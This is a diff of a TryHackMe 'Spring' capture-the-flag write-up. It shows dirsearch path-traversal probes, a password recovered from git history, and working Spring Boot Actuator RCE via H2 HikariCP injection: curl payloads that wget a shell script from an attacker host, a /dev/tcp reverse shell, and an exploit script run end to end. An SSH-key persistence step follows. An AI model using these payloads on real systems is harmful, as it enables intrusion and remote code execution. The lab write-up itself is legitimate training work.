-Added to the queue: sources/new/.git/objects/66/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/69  ->  /sources/new/.git/objects/69/
-Added to the queue: sources/new/.git/objects/69/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/71  ->  /sources/new/.git/objects/71/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/80  ->  /sources/new/.git/objects/80/
-Added to the queue: sources/new/.git/objects/39/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/93  ->  /sources/new/.git/objects/93/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/92  ->  /sources/new/.git/objects/92/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/98  ->  /sources/new/.git/objects/98/
-[20:35:18] 400 -  435B  - /sources/new/.git/objects/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/67  ->  /sources/new/.git/objects/67/
-Added to the queue: sources/new/.git/objects/71/
-Added to the queue: sources/new/.git/objects/80/
-Added to the queue: sources/new/.git/objects/93/
-Added to the queue: sources/new/.git/objects/92/
-Added to the queue: sources/new/.git/objects/98/
-Added to the queue: sources/new/.git/objects/67/
-[20:35:19] 400 -  435B  - /sources/new/.git/objects/a%5c.aspx
-[20:35:34] 302 -    0B  - /sources/new/.git/objects/cc  ->  /sources/new/.git/objects/cc/
-Added to the queue: sources/new/.git/objects/cc/
-[20:35:46] 302 -    0B  - /sources/new/.git/objects/info  ->  /sources/new/.git/objects/info/
-Added to the queue: sources/new/.git/objects/info/
-
-[20:36:22] Starting: sources/new/.git/objects/06/
-[20:36:35] 400 -  435B  - /sources/new/.git/objects/06/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:36:36] 400 -  435B  - /sources/new/.git/objects/06/a%5c.aspx
-
-[20:37:50] Starting: sources/new/.git/objects/29/
-[20:37:59] 400 -  435B  - /sources/new/.git/objects/29/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:38:00] 400 -  435B  - /sources/new/.git/objects/29/a%5c.aspx
-
-[20:39:16] Starting: sources/new/.git/objects/66/
-[20:39:27] 400 -  435B  - /sources/new/.git/objects/66/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:39:28] 400 -  435B  - /sources/new/.git/objects/66/a%5c.aspx
-
-[20:40:45] Starting: sources/new/.git/objects/69/
-[20:40:54] 400 -  435B  - /sources/new/.git/objects/69/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:40:55] 400 -  435B  - /sources/new/.git/objects/69/a%5c.aspx
-
-[20:42:11] Starting: sources/new/.git/objects/39/
-[20:42:21] 400 -  435B  - /sources/new/.git/objects/39/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:42:22] 400 -  435B  - /sources/new/.git/objects/39/a%5c.aspx
-
-[20:43:39] Starting: sources/new/.git/objects/93/
-[20:43:50] 400 -  435B  - /sources/new/.git/objects/93/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:43:51] 400 -  435B  - /sources/new/.git/objects/93/a%5c.aspx
-
-[20:45:09] Starting: sources/new/.git/objects/67/
-[20:45:19] 400 -  435B  - /sources/new/.git/objects/67/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:45:20] 400 -  435B  - /sources/new/.git/objects/67/a%5c.aspx
-
-[20:46:40] Starting: sources/new/.git/objects/71/
-[20:46:51] 400 -  435B  - /sources/new/.git/objects/71/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:46:52] 400 -  435B  - /sources/new/.git/objects/71/a%5c.aspx
-
-[20:48:28] Starting: sources/new/.git/objects/80/
-[20:48:37] 400 -  435B  - /sources/new/.git/objects/80/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:48:38] 400 -  435B  - /sources/new/.git/objects/80/a%5c.aspx
-
-[20:49:40] Starting: sources/new/.git/objects/92/
-[20:49:49] 400 -  435B  - /sources/new/.git/objects/92/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:49:50] 400 -  435B  - /sources/new/.git/objects/92/a%5c.aspx
-
-[20:50:54] Starting: sources/new/.git/objects/98/
-[20:51:03] 400 -  435B  - /sources/new/.git/objects/98/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:51:04] 400 -  435B  - /sources/new/.git/objects/98/a%5c.aspx
-
-[20:52:25] Starting: sources/new/.git/objects/cc/
-[20:52:35] 400 -  435B  - /sources/new/.git/objects/cc/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:52:36] 400 -  435B  - /sources/new/.git/objects/cc/a%5c.aspx
-
-[20:53:42] Starting: sources/new/.git/objects/info/
-[20:53:53] 400 -  435B  - /sources/new/.git/objects/info/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:53:54] 400 -  435B  - /sources/new/.git/objects/info/a%5c.aspx
-
-Task Completed
-```
-
-```bash
-:~/Spring/data$ ls -lah
+(venv) ...:~/Spring/data$ ls -lah
 total 48K
-drwxr-xr-x 5 cyberlaser cyberlaser 4.0K Jan 15 20:42 .
-drwxr-xr-x 5 cyberlaser cyberlaser 4.0K Jan 15 20:30 ..
-drwxr-xr-x 7 cyberlaser cyberlaser 4.0K Jan 15 20:42 .git
--rw-r--r-- 1 cyberlaser cyberlaser  355 Jan 15 20:42 .gitignore
--rw-r--r-- 1 cyberlaser cyberlaser 1.2K Jan 15 20:42 build.gradle
-drwxr-xr-x 3 cyberlaser cyberlaser 4.0K Jan 15 20:42 gradle
--rw-r--r-- 1 cyberlaser cyberlaser 5.4K Jan 15 20:42 gradlew
--rw-r--r-- 1 cyberlaser cyberlaser 3.0K Jan 15 20:42 gradlew.bat
--rw-r--r-- 1 cyberlaser cyberlaser   28 Jan 15 20:42 settings.gradle
--rw-r--r-- 1 cyberlaser cyberlaser   45 Jan 15 20:16 shell.sh
-drwxr-xr-x 4 cyberlaser cyberlaser 4.0K Jan 15 20:42 src
+drwxr-xr-x 5 cyberlaser cyberlaser 4.0K Jan 15 xx:xx .
+drwxr-xr-x 5 cyberlaser cyberlaser 4.0K Jan 15 xx:xx ..
+drwxr-xr-x 7 cyberlaser cyberlaser 4.0K Jan 15 xx:xx .git
+-rw-r--r-- 1 cyberlaser cyberlaser  355 Jan 15 xx:xx .gitignore
+-rw-r--r-- 1 cyberlaser cyberlaser 1.2K Jan 15 xx:xx build.gradle
+drwxr-xr-x 3 cyberlaser cyberlaser 4.0K Jan 15 xx:xx gradle
+-rw-r--r-- 1 cyberlaser cyberlaser 5.4K Jan 15 xx:xx gradlew
+-rw-r--r-- 1 cyberlaser cyberlaser 3.0K Jan 15 xx:xx gradlew.bat
+-rw-r--r-- 1 cyberlaser cyberlaser   28 Jan 15 xx:xx settings.gradle
+-rw-r--r-- 1 cyberlaser cyberlaser   45 Jan 15 xx:xx shell.sh
+drwxr-xr-x 4 cyberlaser cyberlaser 4.0K Jan 15 xx:xx src
 ```
 
 <br>
@@ -457,20 +333,20 @@ drwxr-xr-x 4 cyberlaser cyberlaser 4.0K Jan 15 20:42 src
 
 
 ```bash
-:~/Spring/sources/new/.git/.git$ ls -lah
+(venv) ...:~/Spring/sources/new/.git/.git$ ls -lah
 total 48K
-drwxr-xr-x  7 cyberlaser cyberlaser 4.0K Jan 15 20:49 .
-drwxr-xr-x  5 cyberlaser cyberlaser 4.0K Jan 15 20:49 ..
--rw-r--r--  1 cyberlaser cyberlaser  401 Jan 15 20:49 COMMIT_EDITMSG
--rw-r--r--  1 cyberlaser cyberlaser   23 Jan 15 20:49 HEAD
--rw-r--r--  1 cyberlaser cyberlaser  148 Jan 15 20:49 config
--rw-r--r--  1 cyberlaser cyberlaser   73 Jan 15 20:49 description
-drwxr-xr-x  2 cyberlaser cyberlaser 4.0K Jan 15 20:49 hooks
--rw-r--r--  1 cyberlaser cyberlaser 1.5K Jan 15 20:49 index
-drwxr-xr-x  2 cyberlaser cyberlaser 4.0K Jan 15 20:49 info
-drwxr-xr-x  3 cyberlaser cyberlaser 4.0K Jan 15 20:49 logs
-drwxr-xr-x 40 cyberlaser cyberlaser 4.0K Jan 15 20:49 objects
-drwxr-xr-x  3 cyberlaser cyberlaser 4.0K Jan 15 20:49 refs
+drwxr-xr-x  7 cyberlaser cyberlaser 4.0K Jan 15 xx:xx .
+drwxr-xr-x  5 cyberlaser cyberlaser 4.0K Jan 15 xx:xx ..
+-rw-r--r--  1 cyberlaser cyberlaser  401 Jan 15 xx:xx COMMIT_EDITMSG
+-rw-r--r--  1 cyberlaser cyberlaser   23 Jan 15 xx:xx HEAD
+-rw-r--r--  1 cyberlaser cyberlaser  148 Jan 15 xx:xx config
+-rw-r--r--  1 cyberlaser cyberlaser   73 Jan 15 xx:xx description
+drwxr-xr-x  2 cyberlaser cyberlaser 4.0K Jan 15 xx:xx hooks
+-rw-r--r--  1 cyberlaser cyberlaser 1.5K Jan 15 xx:xx index
+drwxr-xr-x  2 cyberlaser cyberlaser 4.0K Jan 15 xx:xx info
+drwxr-xr-x  3 cyberlaser cyberlaser 4.0K Jan 15 xx:xx logs
+drwxr-xr-x 40 cyberlaser cyberlaser 4.0K Jan 15 xx:xx objects
+drwxr-xr-x  3 cyberlaser cyberlaser 4.0K Jan 15 xx:xx refs
 ```
 
 ```bash
@@ -491,10 +367,10 @@ Date:   Sat Jul 4 23:53:25 2020 +0000
 
 <br>
 <p>
-  
+
 - spring.security.user.name=johnsmith<br>
 - spring.security.user.password=idontwannag0<br>
-+ spring.security.user.password=◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦</p>
+- spring.security.user.password=◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦</p>
 
 ```bash
 (venv) ...:~/Spring/sources/new/.git/.git$ git diff 92b433a86a015517f746a3437ba3802be9146722 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6
@@ -556,34 +432,33 @@ HEAD is now at 1a83ec3 added greeting changed security password to my usual form
 
 ```bash
 (venv) ...:~/Spring/sources/new/.git$ find -ls | grep -v \\.git
-   217813      4 drwxr-xr-x   5 cyberlaser cyberlaser     4096 Jan 15 20:49 .
-   219009      4 -rw-r--r--   1 cyberlaser cyberlaser       28 Jan 15 20:49 ./settings.gradle
-   219008      4 -rw-r--r--   1 cyberlaser cyberlaser     3058 Jan 15 20:49 ./gradlew.bat
-   219003      4 -rw-r--r--   1 cyberlaser cyberlaser     1151 Jan 15 20:49 ./build.gradle
-   219010      4 drwxr-xr-x   4 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src
-   219022      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/test
-   219023      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/test/java
-   219024      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/test/java/com
-   219025      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/test/java/com/onurshin
-   219026      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/test/java/com/onurshin/spring
-   219027      4 -rw-r--r--   1 cyberlaser cyberlaser      214 Jan 15 20:49 ./src/test/java/com/onurshin/spring/ApplicationTests.java
-   219011      4 drwxr-xr-x   4 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main
-   219012      4 drwxr-xr-x   4 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main/java
-   219015      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main/java/com
-   219016      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main/java/com/onurshin
-   219017      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main/java/com/onurshin/spring
-   219018      8 -rw-r--r--   1 cyberlaser cyberlaser     4350 Jan 15 20:49 ./src/main/java/com/onurshin/spring/Application.java
-   219013      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main/java/META-INF
-   219014      4 -rw-r--r--   1 cyberlaser cyberlaser       70 Jan 15 20:49 ./src/main/java/META-INF/MANIFEST.MF
-   219019      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main/resources
-   219020      4 -rw-r--r--   1 cyberlaser cyberlaser     1007 Jan 15 20:49 ./src/main/resources/application.properties
-   219021      4 -rw-r--r--   1 cyberlaser cyberlaser     2581 Jan 15 20:49 ./src/main/resources/dummycert.p12
-   219007      8 -rw-r--r--   1 cyberlaser cyberlaser     5441 Jan 15 20:49 ./gradlew
-   219004      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./gradle
-   219005      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 20:49 ./gradle/wrapper
-   219006      4 -rw-r--r--   1 cyberlaser cyberlaser      238 Jan 15 20:49 ./gradle/wrapper/gradle-wrapper.properties
+   217813      4 drwxr-xr-x   5 cyberlaser cyberlaser     4096 Jan 15 xx:xx .
+   219009      4 -rw-r--r--   1 cyberlaser cyberlaser       28 Jan 15 xx:xx ./settings.gradle
+   219008      4 -rw-r--r--   1 cyberlaser cyberlaser     3058 Jan 15 xx:xx ./gradlew.bat
+   219003      4 -rw-r--r--   1 cyberlaser cyberlaser     1151 Jan 15 xx:xx ./build.gradle
+   219010      4 drwxr-xr-x   4 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src
+   219022      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/test
+   219023      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/test/java
+   219024      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/test/java/com
+   219025      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/test/java/com/onurshin
+   219026      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/test/java/com/onurshin/spring
+   219027      4 -rw-r--r--   1 cyberlaser cyberlaser      214 Jan 15 xx:xx ./src/test/java/com/onurshin/spring/ApplicationTests.java
+   219011      4 drwxr-xr-x   4 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main
+   219012      4 drwxr-xr-x   4 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main/java
+   219015      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main/java/com
+   219016      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main/java/com/onurshin
+   219017      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main/java/com/onurshin/spring
+   219018      8 -rw-r--r--   1 cyberlaser cyberlaser     4350 Jan 15 xx:xx ./src/main/java/com/onurshin/spring/Application.java
+   219013      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main/java/META-INF
+   219014      4 -rw-r--r--   1 cyberlaser cyberlaser       70 Jan 15 xx:xx ./src/main/java/META-INF/MANIFEST.MF
+   219019      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./src/main/resources
+   219020      4 -rw-r--r--   1 cyberlaser cyberlaser     1007 Jan 15 xx:xx ./src/main/resources/application.properties
+   219021      4 -rw-r--r--   1 cyberlaser cyberlaser     2581 Jan 15 xx:xx ./src/main/resources/dummycert.p12
+   219007      8 -rw-r--r--   1 cyberlaser cyberlaser     5441 Jan 15 xx:xx ./gradlew
+   219004      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./gradle
+   219005      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 xx:xx ./gradle/wrapper
+   219006      4 -rw-r--r--   1 cyberlaser cyberlaser      238 Jan 15 xx:xx ./gradle/wrapper/gradle-wrapper.properties
 ```
-
 
 ```bash
 (venv) ...:~/Spring/sources/new/.git$ cat build.gradle
@@ -629,7 +504,6 @@ test {
 }
 (venv) cyberlaser@DESKTOP-0AHBUE8:~/Spring/sources/new/.git$
 ```
-
 
 <br><p align="center">Application.java</p>
 
@@ -746,7 +620,6 @@ public class Application {
 - spring.security.user.name  =johnsmith<br>
 - spring.security.user.password=◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦</p>
 
-
 ```bash
 (venv) :~/Spring/sources/new/.git/src/main/resources$ cat application.properties
 server.port=443
@@ -771,7 +644,6 @@ management.endpoint.heapdump.enabled=false
 spring.resources.static-locations=classpath:/META-INF/resources/, classpath:/resources/, classpath:/static/, classpath:/public/
 ```
 
-
 ```bash
 (venv) :~/Spring/sources/new/.git/src/main/resources$ curl http://spring.thm/ -H 'x-9ad42dea0356cb04: 172.16.0.21' -k -v
 * Host spring.thm:80 was resolved.
@@ -795,11 +667,8 @@ spring.resources.static-locations=classpath:/META-INF/resources/, classpath:/res
 * Connection #0 to host spring.thm left intact
 ```
 
-
-
 ```bash
-(venv) :~/Spring/sources/new/.git/src/main/resources$ curl -X POST -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21'
-'https://spring.thm/actuator/restart' -k
+(venv) :~/Spring/sources/new/.git/src/main/resources$ curl -X POST -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' 'https://spring.thm/actuator/restart' -k
 {"message":"Restarting"}
 ```
 
@@ -814,11 +683,9 @@ bash -i >& /dev/tcp/xxx.xxx.xxx.xx/4444 0>&1
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
-
 ```bash
 (venv) ...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\'java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'ping -c 5 xxx.xxx.xxx.xx\');\"}' "https://xx.xx.xxx.xxx/actuator/env" -k
-{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new','java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('ping -c 5 192.168.140.47');"}(venv)
+{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new','java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('ping -c 5 xxx.xxx.xxx.xx');"}(venv)
 ```
 
 ```bash
@@ -828,7 +695,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 ```bash
 (venv) ...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'wget http://xxx.xxx.xxx.xx/shell.sh -O /tmp/shell.sh\');\"}' "https://xx.xx.xxx.xxx/actuator/env" -k
-{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('wget http://192.168.140.47/shell.sh -O /tmp/shell.sh');"}(venv)
+{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('wget http://xxx.xxx.xxx.xx/shell.sh -O /tmp/shell.sh');"}(venv)
 ```
 
 ```bash
@@ -863,41 +730,106 @@ xx.xx.xxx.x - - [15/Jan/2026 xx:xx:xx] "GET /shell.sh HTTP/1.1" 200 -
 {"message":"Restarting"}
 ```
 
-<img width="1344" height="293" alt="image" src="https://github.com/user-attachments/assets/550bfaeb-7e7f-407c-b1a9-9be277042fd5" />
+<br>
+<h1 align="center">Exploit: Spring Boot Actuator RCE via H2 HikariCP Injection : <a href="https://raw.githubusercontent.com/RosanaFSS/Cybersecurity-Journey-TryHackMe/refs/heads/CTFs-%26-Infos/Hard%20%F0%9F%9A%A9%20-%20Spring/Hard%20%F0%9F%9A%A9%20-%20Spring%20-%20ex.sh">ex.sh</a><a id='6'></a></h1>
 
+
+```bash
+:~/Spring$ bash ex.sh
+
+                            Downloading shell.sh
+
+[*]                              Injecting payload...
+{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('wget http://xxx.xxx.xxx.xx/shell.sh -O /tmp/shell.sh');"}
+                            Payload Sent
+[*] Triggering application restart...
+{"message":"Restarting"}
+                            Restart triggered. Waiting 15s for execution ...
+
+                            chmod +x shell.sh
+
+[*]                              Injecting payload...
+{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('chmod +x /tmp/shell.sh');"}
+                            Payload Sent
+[*] Triggering application restart...
+{"message":"Restarting"}
+                            Restart triggered. Waiting 15s for execution ...
+
+                            Executing shell.sh
+
+[!]                         GUarantee that your Listener is up in port 4444
+
+[*]                              Injecting payload...
+{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('bash /tmp/shell.sh');"}
+                            Payload Sent
+[*] Triggering application restart...
+{"message":"Restarting"}
+                            Restart triggered. Waiting 15s for execution ...
+
+[+]                         DONE.
+```
+
+<img width="1858" height="674" alt="image" src="https://github.com/user-attachments/assets/75737177-dafd-4437-94d5-54b8e04084c6" />
+
+<br>
+<br>
 <br>
 
 ```bash
-(venv) ...:~/Spring/data$ nc -nlvp 4444
+:~/Spring/data$ nc -nlvp 4444
 Listening on 0.0.0.0 4444
 Connection received on xx.xx.xxx.xxx 58838
 bash: cannot set terminal process group (1035): Inappropriate ioctl for device
 bash: no job control in this shell
+nobody@spring:/$ whoami
+nobody
+```
+
+```bash
 nobody@spring:/$ id
 id
 uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+```
+
+```bash
 nobody@spring:/$ pwd
 pwd
 /
-nobody@spring:/home$ python3 -c 'import pty; pty.spawn("/bin/bash")'
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-nobody@spring:/home$ ^Z
-[1]+  Stopped                 nc -nlvp 4444
-...:~/Spring/data$ stty raw -echo; fg
-nc -nlvp 4444
-
-nobody@spring:/home$ export TERM=xterm
-nobody@spring:/home$
-
-nobody@spring:/home$ find / -name "foothold.txt" 2>/dev/null
-find / -name "foothold.txt" 2>/dev/null
-/opt/foothold.txt
-nobody@spring:/home$ cat /opt/foothold.txt
-cat /opt/foothold.txt
-THM{dont_expose_.git_to_internet}
-nobody@spring:/home$
 ```
 
+```bash
+nobody@spring:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```bash
+nobody@spring:/$ ^Z
+[1]+  Stopped                 nc -nlvp 4444
+```
+
+```bash
+...:~/Spring/data$ stty raw -echo; fg
+nc -nlvp 4444
+```
+
+```bash
+nobody@spring:/$ export TERM=xterm-256color
+```
+
+```bash
+nobody@spring:/$ find / -name "foothold.txt" 2>/dev/null
+/opt/foothold.txt
+```
+
+```bash
+nobody@spring:/$ cat /opt/foothold.txt
+THM{••••••••••••••••••••••••••••}
+```
+
+<img width="1336" height="186" alt="image" src="https://github.com/user-attachments/assets/6fa649d2-ea94-4311-afd6-4f84bfd67691" />
+
+<br>
+<br>
 <br>
 <p>1.1. <em>What's the flag in foothold.txt?</em><br>
 <code>THM{••••••••••••••••••••••••••••}</code></p>
@@ -905,8 +837,6 @@ nobody@spring:/home$
 <br>
 
 ```bash
-nobody@spring:/$ pwd
-/
 nobody@spring:/$ find / -name "user.txt" 2>/dev/null
 /home/johnsmith/user.txt
 ```
@@ -916,6 +846,12 @@ nobody@spring:/$ su johnsmith
 Password:
 johnsmith@spring:/$
 ```
+
+<img width="1333" height="203" alt="image" src="https://github.com/user-attachments/assets/73779e4e-5673-4df0-bae7-804d44468d2e" />
+
+<br>
+<br>
+<br>
 
 ```bash
 johnsmith@spring:/$ cd /home/johnsmith/
@@ -931,32 +867,116 @@ johnsmith@spring:~$ cat user.txt
 THM{•••••••••••••••••••••••••••}
 ```
 
+<img width="1327" height="292" alt="image" src="https://github.com/user-attachments/assets/cd84d2f3-01d1-47a4-a189-216a574c664f" />
 
+<br>
+<br>
 <br>
 <p>1.2. <em>What's the flag in user.txt?</em><br>
 <code>THM{•••••••••••••••••••••••••••}</code></p>
-
-
 <br>
 <br>
 <br>
 
 ```bash
-johnsmith@spring:~/tomcatlogs$ ls -lah
-total 364K
-drwxrwxr-x 2 johnsmith johnsmith 4.0K Jan 16 00:47 .
-drwxr-xr-x 7 johnsmith johnsmith 4.0K Jul 10  2020 ..
--rw-r--r-- 1 root      root      6.8K Jul 10  2020 1594410148.log
--rw-r--r-- 1 root      root      6.6K Jul 10  2020 1594410465.log
--rw-r--r-- 1 root      root      5.2K Jul 10  2020 1594413491.log
--rw-r--r-- 1 root      root      7.1K Jul 12  2020 1594552377.log
--rw-r--r-- 1 root      root      6.9K Jul 12  2020 1594574751.log
--rw-r--r-- 1 root      root      7.3K Jul 12  2020 1594575333.log
--rw-r--r-- 1 root      root      7.1K Jul 12  2020 1594576008.log
--rw-r--r-- 1 root      root      6.6K Jul 12  2020 1594584453.log
--rw-r--r-- 1 root      root      291K Jan 16 01:16 1768524456.log
+johnsmith@spring:~$ ls -lah
+total 44K
+drwxr-xr-x 7 johnsmith johnsmith 4.0K Jul 10  2020 .
+drwxr-xr-x 3 root      root      4.0K Jun 28  2020 ..
+lrwxrwxrwx 1 johnsmith johnsmith    9 Jul 10  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 johnsmith johnsmith  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 johnsmith johnsmith 3.7K Apr  4  2018 .bashrc
+drwx------ 2 johnsmith johnsmith 4.0K Jul 10  2020 .cache
+drwx------ 3 johnsmith johnsmith 4.0K Jun 28  2020 .gnupg
+drwxrwxr-x 3 johnsmith johnsmith 4.0K Jul 10  2020 .local
+-rw-r--r-- 1 johnsmith johnsmith  807 Apr  4  2018 .profile
+drwx------ 2 johnsmith johnsmith 4.0K Jul 10  2020 .ssh
+drwxrwxr-x 2 johnsmith johnsmith 4.0K Jan 16 16:51 tomcatlogs
+-r-------- 1 johnsmith johnsmith   34 Jul 10  2020 user.txt
 ```
 
+```bash
+:~/Spring$ ssh-keygen
+...
++----[SHA256]-----+
+```
+
+```bash
+:~/Spring$  ls
+data  id_john  id_john.pub  sources
+```
+
+```bash
+:~/Spring$ cat id_john.pub
+ssh-rsa ssh-...
+```
+
+```bash
+johnsmith@spring:~$ echo 'ssh-rsa ssh-...' > /home/johnsmith/.ssh/authorized_keys
+```
+
+```bash
+johnsmith@spring:~/.ssh$ ls -lah
+total 12K
+drwx------ 2 johnsmith johnsmith 4.0K Jan 16 19:04 .
+drwxr-xr-x 7 johnsmith johnsmith 4.0K Jul 10  2020 ..
+-rw-rw-r-- 1 johnsmith johnsmith  108 Jan 16 19:04 authorized_keys
+```
+```bash
+:~/Spring$ ssh -i id_john johnsmith@spring.thm
+...
+johnsmith@spring:~$
+```
+
+```bash
+johnsmith@spring:~/tomcatlogs$ getent hosts
+127.0.0.1       localhost
+127.0.1.1       spring
+127.0.0.1       ip6-localhost ip6-loopback
+```
+
+```bash
+johnsmith@spring:~/tomcatlogs$ ps aux | grep spring
+johnsmi+  7856  0.0  0.1  13136  1000 pts/1    S+   19:24   0:00 grep --color=auto spring
+```
+
+```bash
+johnsmith@spring:~/tomcatlogs$ ps aux | grep root
+johnsmi+  7860  0.0  0.1  13136  1056 pts/1    S+   19:26   0:00 grep --color=auto root
+```
+
+```bash
+johnsmith@spring:~$ cat /etc/systemd/system/spring.service
+[Unit]
+Description=Spring Boot Application
+After=syslog.target
+StartLimitIntervalSec=0
+
+[Service]
+User=root
+Restart=always
+RestartSec=1
+ExecStart=/root/start_tomcat.sh
+
+[Install]
+WantedBy=multi-user.target
+```
+
+```bash
+johnsmith@spring:~$ systemctl status spring
